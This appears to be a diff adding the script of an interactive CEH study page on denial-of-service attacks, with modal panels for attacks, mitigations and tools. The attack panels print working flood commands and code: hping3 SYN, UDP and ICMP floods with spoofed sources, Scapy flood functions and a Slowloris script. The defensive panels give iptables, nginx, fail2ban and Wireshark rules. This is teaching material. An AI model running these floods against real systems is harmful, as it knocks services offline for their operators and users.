+                            <div style="font-family: monospace; background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px;">
+# Simulated SYN flood using hping3<br>
+# WARNING: Only use on authorized systems<br>
+<br>
+# Basic SYN flood<br>
+hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source target.com<br>
+<br>
+# Parameters explanation:<br>
+# -c: packet count<br>
+# -d: data size<br>
+# -S: SYN flag<br>
+# -w: window size<br>
+# -p: target port<br>
+# --flood: send packets as fast as possible<br>
+# --rand-source: randomize source IP
+                            </div>
+                            <p><strong>Detection Signs:</strong></p>
+                            <ul>
+                                <li>High number of SYN_RECV connections</li>
+                                <li>Server connection table filling up</li>
+                                <li>Increased memory usage</li>
+                                <li>New connection rejections</li>
+                            </ul>
+                        </div>
+                    `;
+                    break;
+                    
+                case 'udp_flood':
+                    content = `
+                        <h3>🎯 UDP Flood Attack Demonstration</h3>
+                        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0;">
+                            <h4>Attack Mechanism</h4>
+                            <div style="font-family: monospace; background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px;">
+# UDP flood using hping3<br>
+hping3 -2 -c 10000 -d 120 -p 53 --flood target.com<br>
+<br>
+# Using Scapy for custom UDP flood<br>
+from scapy.all import *<br>
+<br>
+def udp_flood(target, port, count):<br>
+&nbsp;&nbsp;&nbsp;&nbsp;for i in range(count):<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;packet = IP(dst=target)/UDP(dport=port)/Raw(load="X"*1024)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;send(packet, verbose=0)
+                            </div>
+                            <p><strong>Impact:</strong> Consumes bandwidth and forces target to respond with ICMP Destination Unreachable messages.</p>
+                        </div>
+                    `;
+                    break;
+                    
+                case 'slowloris':
+                    content = `
+                        <h3>🎯 Slowloris Attack Demonstration</h3>
+                        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0;">
+                            <h4>Low-Bandwidth Application Layer Attack</h4>
+                            <div style="font-family: monospace; background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px;">
+# Basic Slowloris concept<br>
+import socket<br>
+import time<br>
+import threading<br>
+<br>
+def slowloris_connection(target, port):<br>
+&nbsp;&nbsp;&nbsp;&nbsp;sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;sock.connect((target, port))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;sock.send("GET / HTTP/1.1\\r\\n".encode())<br>
+&nbsp;&nbsp;&nbsp;&nbsp;sock.send("Host: {}\\r\\n".format(target).encode())<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;# Keep connection alive with partial headers<br>
+&nbsp;&nbsp;&nbsp;&nbsp;while True:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sock.send("X-a: b\\r\\n".encode())<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(15)
+                            </div>
+                            <p><strong>Effectiveness:</strong> Can take down web servers with minimal bandwidth using just hundreds of connections.</p>
+                        </div>
+                    `;
+                    break;
+            }
+            
+            showModal('Attack Demonstration', content);
+        }
+
+        function showMitigationExample(type) {
+            let content = '';
+            
+            switch(type) {
+                case 'iptables':
+                    content = `
+                        <h3>🛡️ iptables-based DDoS Protection</h3>
+                        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0;">
+                            <h4>Rate Limiting Rules</h4>
+                            <div style="font-family: monospace; background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px;">
+# Limit connections per IP<br>
+iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 25 -j REJECT<br>
+<br>
+# Rate limit SYN packets<br>
+iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT<br>
+iptables -A INPUT -p tcp --syn -j DROP<br>
+<br>
+# Limit ICMP packets<br>
+iptables -A INPUT -p icmp -m limit --limit 1/s --limit-burst 1 -j ACCEPT<br>
+iptables -A INPUT -p icmp -j DROP<br>
+<br>
+# Block known attack sources<br>
+iptables -A INPUT -s 192.168.1.100 -j DROP
+                            </div>
+                        </div>
+                    `;
+                    break;
+                    
+                case 'nginx':
+                    content = `
+                        <h3>🛡️ Nginx DDoS Protection Configuration</h3>
+                        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0;">
+                            <h4>Rate Limiting and Security Headers</h4>
+                            <div style="font-family: monospace; background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px;">
+# Rate limiting configuration<br>
+http {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;limit_req_zone $binary_remote_addr zone=dos_protection:10m rate=10r/s;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;limit_conn_zone $binary_remote_addr zone=conn_limit_per_ip:10m;<br>
+}<br>
+<br>
+server {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;# Apply rate limits<br>
+&nbsp;&nbsp;&nbsp;&nbsp;limit_req zone=dos_protection burst=20 nodelay;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;limit_conn conn_limit_per_ip 10;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;# Connection timeouts<br>
+&nbsp;&nbsp;&nbsp;&nbsp;client_body_timeout 10s;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;client_header_timeout 10s;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;keepalive_timeout 5 5;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;send_timeout 10s;<br>
+}
+                            </div>
+                        </div>
+                    `;
+                    break;
+                    
+                case 'fail2ban':
+                    content = `
+                        <h3>🛡️ Fail2ban Automated Banning</h3>
+                        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0;">
+                            <h4>Automatic IP Blocking Configuration</h4>
+                            <div style="font-family: monospace; background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px;">
+# /etc/fail2ban/jail.local<br>
+[DEFAULT]<br>
+bantime = 3600<br>
+findtime = 600<br>
+maxretry = 3<br>
+<br>
+[nginx-req-limit]<br>
+enabled = true<br>
+filter = nginx-req-limit<br>
+action = iptables-multiport[name=ReqLimit, port="http,https", protocol=tcp]<br>
+logpath = /var/log/nginx/error.log<br>
+findtime = 600<br>
+bantime = 7200<br>
+maxretry = 10<br>
+<br>
+# Filter configuration<br>
+# /etc/fail2ban/filter.d/nginx-req-limit.conf<br>
+[Definition]<br>
+failregex = limiting requests, excess: .* by zone .*, client: &lt;HOST&gt;
+                            </div>
+                        </div>
+                    `;
+                    break;
+            }
+            
+            showModal('Mitigation Example', content);
+        }
+
+        function showToolDetails(tool) {
+            let content = '';
+            
+            switch(tool) {
+                case 'hping3':
+                    content = `
+                        <h3>🔨 hping3 - Advanced Packet Generator</h3>
+                        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0;">
+                            <h4>Key Features</h4>
+                            <ul>
+                                <li>TCP/UDP/ICMP packet generation</li>
+                                <li>Advanced header manipulation</li>
+                                <li>Traceroute with different protocols</li>
+                                <li>Port scanning capabilities</li>
+                                <li>Firewall testing and bypassing</li>
+                            </ul>
+                            
+                            <h4>Common Usage Examples</h4>
+                            <div style="font-family: monospace; background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px;">
+# Basic SYN scan<br>
+hping3 -S -p 80 target.com<br>
+<br>
+# TCP flood with random source<br>
+hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source target.com<br>
+<br>
+# UDP flood<br>
+hping3 -2 -c 1000 -d 120 -p 53 --flood target.com<br>
+<br>
+# ICMP flood<br>
+hping3 -1 --flood target.com<br>
+<br>
+# Traceroute using TCP<br>
+hping3 -T -p 80 target.com
+                            </div>
+                            
+                            <div style="background: #fff3cd; border: 1px solid #ffeaa7; padding: 10px; border-radius: 5px; margin-top: 15px;">
+                                <strong>⚠️ Legal Warning:</strong> Only use hping3 on networks you own or have explicit permission to test.
+                            </div>
+                        </div>
+                    `;
+                    break;
+                    
+                case 'scapy':
+                    content = `
+                        <h3>🐍 Scapy - Packet Manipulation Library</h3>
+                        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0;">
+                            <h4>Python-Based Network Analysis</h4>
+                            <ul>
+                                <li>Interactive packet manipulation</li>
+                                <li>Protocol decoding and encoding</li>
+                                <li>Custom packet crafting</li>
+                                <li>Network reconnaissance</li>
+                                <li>Automated attack scripting</li>
+                            </ul>
+                            
+                            <h4>Sample Attack Scripts</h4>
+                            <div style="font-family: monospace; background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px;">
+from scapy.all import *<br>
+import random<br>
+<br>
+# SYN flood function<br>
+def syn_flood(target, port, count):<br>
+&nbsp;&nbsp;&nbsp;&nbsp;for i in range(count):<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;src_ip = ".".join([str(random.randint(1,254)) for _ in range(4)])<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;packet = IP(src=src_ip, dst=target) / TCP(dport=port, flags="S")<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;send(packet, verbose=0)<br>
+<br>
+# ICMP flood<br>
+def icmp_flood(target, count):<br>
+&nbsp;&nbsp;&nbsp;&nbsp;packet = IP(dst=target) / ICMP()<br>
+&nbsp;&nbsp;&nbsp;&nbsp;send(packet * count, verbose=0)<br>
+<br>
+# Usage (authorized testing only)<br>
+syn_flood("192.168.1.100", 80, 1000)
+                            </div>
+                        </div>
+                    `;
+                    break;
+                    
+                case 'wireshark':
+                    content = `
+                        <h3>🦈 Wireshark - Network Traffic Analysis</h3>
+                        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0;">
+                            <h4>DDoS Detection with Wireshark</h4>
+                            <ul>
+                                <li>Real-time packet capture and analysis</li>
+                                <li>Protocol decoding and filtering</li>
+                                <li>Statistical analysis capabilities</li>
+                                <li>Flow analysis and reconstruction</li>
+                                <li>Expert analysis system</li>
+                            </ul>
+                            
+                            <h4>Useful Display Filters for DDoS Analysis</h4>
+                            <div style="font-family: monospace; background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px;">
+# SYN flood detection<br>
+tcp.flags.syn == 1 and tcp.flags.ack == 0<br>
+<br>
+# ICMP flood analysis<br>
+icmp and icmp.type == 8<br>
+<br>
+# UDP flood to specific port<br>
+udp.dstport == 53<br>
+<br>
+# High volume from single source<br>
+ip.src == 192.168.1.100<br>
+<br>
+# Fragmented packets (potential attack)<br>
+ip.flags.mf == 1 or ip.frag_offset > 0<br>
+<br>
+# Conversations analysis<br>
+# Statistics > Conversations > IPv4
+                            </div>
+                            
+                            <h4>Analysis Techniques</h4>
+                            <ul>
+                                <li><strong>Conversation Analysis:</strong> Identify top talkers</li>
+                                <li><strong>Protocol Hierarchy:</strong> Analyze traffic distribution</li>
+                                <li><strong>I/O Graphs:</strong> Visualize traffic patterns over time</li>
+                                <li><strong>Expert Info:</strong> Identify protocol anomalies</li>
+                            </ul>
+                        </div>
+                    `;
+                    break;
+            }
+            
+            showModal('Tool Details', content);
+        }
+
+        // Add event listeners for interactive elements
+        document.addEventListener('DOMContentLoaded', function() {
+            // Add click handlers for attack cards to show details
+            document.querySelectorAll('.attack-card').forEach(card => {
+                card.style.cursor = 'pointer';
+                card.addEventListener('click', function() {
+                    const title = this.querySelector('h4').textContent;
+                    const content = this.innerHTML;
+                    showModal(title, `<div style="max-height: 60vh; overflow-y: auto;">${content}</div>`);
+                });
+            });
+        });
+
+        // Study time tracker
+        function displayStudyTime() {
+            const minutes = calculateStudyTime();
+            const hours = Math.floor(minutes / 60);
+            const remainingMinutes = minutes % 60;
+            
+            if (hours > 0) {
+                return `${hours}h ${remainingMinutes}m`;
+            } else {
+                return `${remainingMinutes}m`;
+            }
+        }
+
+        // Performance analytics
+        function trackLearningAnalytics() {
+            const analytics = {
+                totalSections: sectionOrder.length,
+                completedSections: completedSections.size,
+                currentSection: currentSection,
+                studyTime: displayStudyTime(),
+                quizScore: quizScore,
+                completionRate: Math.round((completedSections.size / sectionOrder.length) * 100)
+            };
+            
+            return analytics;
+        }
+
+        // Export study progress
+        function exportProgress() {
+            const progress = trackLearningAnalytics();
+            const dataStr = JSON.stringify(progress, null, 2);
+            const dataBlob = new Blob([dataStr], {type: 'application/json'});
+            const url = URL.createObjectURL(dataBlob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = `CEH_Module10_Progress_${new Date().toISOString().split('T')[0]}.json`;
+            link.click();
+        }
+
+        // Print study guide
+        function printStudyGuide() {
+            window.print();
+        }
+
+        // Additional interactive features can be added here as needed
+    </script>
+</body>
+</html>
